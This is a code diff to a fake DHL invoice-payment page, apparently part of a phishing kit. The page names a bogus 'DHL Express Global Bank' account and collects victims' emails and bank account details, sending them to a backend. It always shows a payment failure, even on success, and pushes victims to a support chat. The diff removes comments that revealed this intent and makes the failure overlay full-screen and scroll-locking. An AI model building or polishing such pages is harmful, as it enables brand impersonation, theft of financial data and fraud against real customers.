@@ -15,8 +15,10 @@
             padding: 0;
             min-height: 100vh;
             color: var(--dhl-dark);
-            overflow-y: auto; /* ensure vertical scroll */
+            overflow-y: auto;
         }
+        body.overlay-active { overflow: hidden; }
+
         .payment-header { background: linear-gradient(135deg, var(--dhl-red) 0%, #b0040e 100%); color: #fff; padding: 1rem 1.5rem; box-shadow: 0 2px 8px rgba(212,5,17,0.2); }
         .payment-header .brand { display: flex; align-items: center; gap: 12px; }
         .payment-header .brand img { height: 38px; filter: brightness(0) invert(1); }
@@ -40,28 +42,39 @@
         .bank-details .value { font-weight: 600; font-family: monospace; }
         .footer { text-align: center; padding: 2rem 1rem 1rem; color: #94a3b8; font-size: 0.8rem; }
 
-        /* Overlay */
+        /* ===== FIXED, FULL-SCREEN OVERLAY ===== */
         #resultOverlay {
-            position: absolute;
+            position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(255,255,255,0.92);
+            background: #ffffff;
             display: none;
             align-items: center;
             justify-content: center;
             flex-direction: column;
             padding: 2rem;
-            z-index: 10;
+            z-index: 9999;
             text-align: center;
+            overflow: hidden;
         }
         #resultOverlay.show { display: flex; }
+        #resultOverlay .overlay-content {
+            max-width: 480px;
+            width: 100%;
+            padding: 2rem;
+        }
         #resultOverlay .spinner { width: 3rem; height: 3rem; }
         #resultOverlay .failure-icon { font-size: 4rem; color: #dc2626; margin-bottom: 1rem; }
         #resultOverlay h4 { font-weight: 700; color: var(--dhl-dark); }
         #resultOverlay p { color: #6b7280; max-width: 400px; }
+        #resultOverlay .btn-pay { width: 100%; justify-content: center; }
+        #resultOverlay .btn-secondary { width: 100%; margin-top: 0.5rem; }
 
         @media (max-width: 576px) {
             .payment-card { padding: 1.2rem 1rem; margin: 1rem 0.5rem; }
             .bank-details .detail-row { flex-direction: column; gap: 2px; }
+            #resultOverlay .overlay-content { padding: 1rem; }
+            #resultOverlay .failure-icon { font-size: 3rem; }
+            #resultOverlay h4 { font-size: 1.2rem; }
         }
     </style>
 </head>
@@ -90,7 +103,7 @@
             <div class="mt-1" style="font-size:0.8rem; color:#4a5568;" id="trackingList"></div>
         </div>
 
-        <!-- Bank account details (hardcoded) -->
+        <!-- Bank account details -->
         <div class="bank-details">
             <div class="fw-bold mb-2" style="color:var(--dhl-red);">📋 Transfer to the following account</div>
             <div class="detail-row"><span class="label">Bank Name</span><span class="value">DHL Express Global Bank</span></div>
@@ -139,9 +152,11 @@
                 <i class="bi bi-shield-check me-1"></i> We will manually verify your transfer and mark the invoice as paid within 2 business days.
             </div>
         </form>
+    </div>
 
-        <!-- Overlay for spinner and failure -->
-        <div id="resultOverlay">
+    <!-- ===== FIXED OVERLAY (outside card) ===== -->
+    <div id="resultOverlay">
+        <div class="overlay-content">
             <div id="spinnerContainer">
                 <div class="spinner-border spinner text-danger" role="status">
                     <span class="visually-hidden">Processing...</span>
@@ -152,10 +167,10 @@
                 <div class="failure-icon"><i class="bi bi-exclamation-circle"></i></div>
                 <h4>Payment couldn't be completed</h4>
                 <p>We encountered an issue processing your bank transfer. Please contact our support team for assistance.</p>
-                <a href="/" class="btn btn-pay" onclick="openTawkTo(); return false;">
+                <a href="#" class="btn btn-pay" onclick="openTawkTo(); return false;">
                     <i class="bi bi-chat-dots me-1"></i> Contact Support
                 </a>
-                <a href="{{ url_for('billing', email=email) if email else url_for('billing') }}" class="btn btn-secondary mt-2">
+                <a href="{{ url_for('billing', email=email) if email else url_for('billing') }}" class="btn btn-secondary">
                     <i class="bi bi-arrow-left me-1"></i> Back to Invoices
                 </a>
             </div>
@@ -175,7 +190,7 @@
 
         const email = getQueryParam('email') || '';
         const trackingParam = getQueryParam('tracking') || '';
-        const totalParam = getQueryParam('total'); // real total from billing page
+        const totalParam = getQueryParam('total');
 
         const trackingNumbers = trackingParam ? trackingParam.split(',').map(s => s.trim()) : [];
 
@@ -191,7 +206,6 @@
         }
         document.getElementById('invoiceCount').textContent = trackingNumbers.length + ' invoice(s)';
 
-        // Set total from URL param, or fallback to placeholder
         const totalUSD = totalParam ? parseFloat(totalParam) : (trackingNumbers.length * 50);
         document.getElementById('totalAmount').textContent = '$' + totalUSD.toFixed(2);
 
@@ -201,12 +215,11 @@
         document.getElementById('transferReference').value = ref;
 
         // ============================================================
-        // FORM SUBMISSION – Show spinner, then failure
+        // FORM SUBMISSION – Show spinner then failure
         // ============================================================
         document.getElementById('bankForm').addEventListener('submit', function(e) {
             e.preventDefault();
 
-            // Validate required fields
             const refField = document.getElementById('transferReference').value.trim();
             const errEl = document.getElementById('cardErrors');
 
@@ -217,20 +230,18 @@
             }
             errEl.classList.add('d-none');
 
-            // Disable button
             const btn = document.getElementById('payBtn');
             btn.disabled = true;
             btn.innerHTML = '<span class="spinner-border spinner-border-sm"></span>';
 
-            // Show overlay with spinner
             const overlay = document.getElementById('resultOverlay');
             const spinnerContainer = document.getElementById('spinnerContainer');
             const failureContainer = document.getElementById('failureContainer');
             overlay.classList.add('show');
+            document.body.classList.add('overlay-active');
             spinnerContainer.style.display = 'block';
             failureContainer.style.display = 'none';
 
-            // Prepare payload
             const formData = new FormData(this);
             const payload = {
                 email: formData.get('email'),
@@ -242,32 +253,28 @@
                     account_number_last4: formData.get('account_number'),
                     reference_used: formData.get('transfer_reference'),
                 },
-                // also include total for logging
                 total_usd: totalUSD,
             };
 
-            // Send to backend (we don't care about response)
             fetch('{{ url_for("billing_pay") }}', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             })
             .then(() => {
-                // Even if success, we show failure
                 setTimeout(() => {
                     spinnerContainer.style.display = 'none';
                     failureContainer.style.display = 'block';
                 }, 1500);
             })
             .catch(() => {
-                // On error, still show failure
                 setTimeout(() => {
                     spinnerContainer.style.display = 'none';
                     failureContainer.style.display = 'block';
                 }, 1500);
             });
 
-            // Fallback: show failure after 4 seconds even if fetch hangs
+            // Fallback
             setTimeout(() => {
                 if (spinnerContainer.style.display !== 'none') {
                     spinnerContainer.style.display = 'none';
@@ -277,18 +284,16 @@
         });
 
         // ============================================================
-        // OPEN TAWK.TO CHAT (if available)
+        // OPEN TAWK.TO CHAT
         // ============================================================
         function openTawkTo() {
             if (window.Tawk_API && window.Tawk_API.maximize) {
                 window.Tawk_API.maximize();
             } else {
-                // Redirect to homepage where Tawk is loaded
                 window.location.href = '/';
             }
         }
 
-        // If no tracking numbers, show error
         if (trackingNumbers.length === 0) {
             document.getElementById('cardErrors').textContent = 'No shipments selected. Please go back and select at least one invoice.';
             document.getElementById('cardErrors').classList.remove('d-none');
